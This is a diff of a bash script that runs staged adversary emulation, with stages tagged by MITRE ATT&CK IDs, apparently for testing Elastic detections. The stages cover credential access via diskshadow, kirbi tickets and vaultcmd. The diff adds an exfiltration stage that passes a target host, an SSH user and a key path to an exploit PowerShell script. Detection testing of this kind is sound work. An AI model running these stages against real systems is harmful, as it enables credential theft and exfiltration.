@@ -44,7 +44,7 @@ while [[ $# -gt 0 ]]; do
             printf '  -s, --stage  Run a single stage (1-8). Omit to run all stages.\n' >&2
             printf '  Stages: 1=Discovery  2=Initial Access  3=ML Anomaly  4=Persistence\n' >&2
             printf '          5=Cred Access (diskshadow)  6=Cred Access (kirbi)\n' >&2
-            printf '          7=Cred Access (vaultcmd)  8=Collection  9=Cleanup\n' >&2
+            printf '          7=Cred Access (vaultcmd)  8=Collection  9=Exfil  10=Cleanup\n' >&2
             exit 1
             ;;
     esac
@@ -76,7 +76,7 @@ run_single_stage() {
             # logs the entire file on load, and Elastic would kill the process before
             # any stage runs, blocking all other stages as collateral damage.
             printf '\n'
-            printf '\033[0;36m--- [3/8] Execution - Obfuscated payload for ML anomaly detection (T1059.001, T1027.010) ---\033[0m\n'
+            printf '\033[0;36m--- [3/9] Execution - Obfuscated payload for ML anomaly detection (T1059.001, T1027.010) ---\033[0m\n'
             printf '  Executing obfuscated script (ml_trigger.ps1)...'
             run_stage 3 "$ML_PS1" ""
             ;;
@@ -84,10 +84,11 @@ run_single_stage() {
         5) run_stage 5 "$EXPLOIT_PS1" "-Stage 5" ;;
         6) run_stage 6 "$EXPLOIT_PS1" "-Stage 6" ;;
         7) run_stage 7 "$EXPLOIT_PS1" "-Stage 7" ;;
-        8) run_stage 8 "$EXPLOIT_PS1" "-Stage 8" ;;
-        9) run_stage 9 "$EXPLOIT_PS1" "-Stage 9" ;;
+        8)  run_stage 8  "$EXPLOIT_PS1" "-Stage 8"  ;;
+        9)  run_stage 9  "$EXPLOIT_PS1" "-Stage 9 -ExfilTarget \"$EXFILL_TARGET\" -ExfilUser \"$EXFILL_SSH_USER\" -ExfilKeyPath \"$EXFIL_WIN_SSH_KEY\"" ;;
+        10) run_stage 10 "$EXPLOIT_PS1" "-Stage 10" ;;
         *)
-            printf 'Error: invalid stage "%s". Must be 1-9.\n' "$1" >&2
+            printf 'Error: invalid stage "%s". Must be 1-10.\n' "$1" >&2
             exit 1
             ;;
     esac
@@ -105,6 +106,7 @@ else
     run_single_stage 7
     run_single_stage 8
     run_single_stage 9
+    run_single_stage 10
 
     printf '\n'
     printf '\033[1;33m══════════════════════════════════════════════\033[0m\n'
